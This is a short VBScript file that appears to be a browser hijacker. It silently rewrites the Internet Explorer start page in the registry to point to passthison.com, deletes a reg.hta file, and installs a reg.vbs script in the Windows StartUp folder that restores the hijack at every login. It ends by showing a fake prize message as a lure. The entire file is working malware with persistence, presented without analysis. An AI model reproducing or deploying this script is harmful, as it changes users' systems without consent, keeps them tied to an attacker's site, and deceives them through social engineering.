On Error Resume Next
Set wscr=CreateObject("WScript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
filename="c:\Windows\Start Menu\Programs\StartUp\reg.hta"
if (fso.FileExists(filename)) Then
fso.DeleteFile(filename)
End If	
ss="http://www.passthison.com/r1/?did-you-win-something-this-time"
aa=wscr.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",ss)
Set ts = fso.CreateTextFile("c:\Windows\Start Menu\Programs\StartUp\reg.vbs", True)
ts.WriteLine("On Error Resume Next")
ts.WriteLine("set wscr=CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
ts.WriteLine("Set fso=CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")")
ts.WriteLine("filename=" & Chr(34) & "c:\Windows\Start Menu\Programs\StartUp\reg.hta" & Chr(34))
ts.WriteLine("if (fso.FileExists(filename)) Then")
ts.WriteLine("fso.DeleteFile(filename)")
ts.WriteLine("End If")
ts.WriteLine("rr=wscr.RegRead(" & Chr(34) & "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page" & Chr(34) & ")")
ts.WriteLine("If InStr(LCase(rr)," & Chr(34) & "passthison.com" & Chr(34) & ")=0 Then")
ts.WriteLine("ss=" & Chr(34) & "http://www.passthison.com/r3/?" & Chr(34) & " + rr")
ts.WriteLine("aa=wscr.RegWrite(" & Chr(34) & "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page" & Chr(34) & ",ss)")
ts.WriteLine("End If")
ts.Close
MsgBox("Congratulations, you are one step closer to winning!")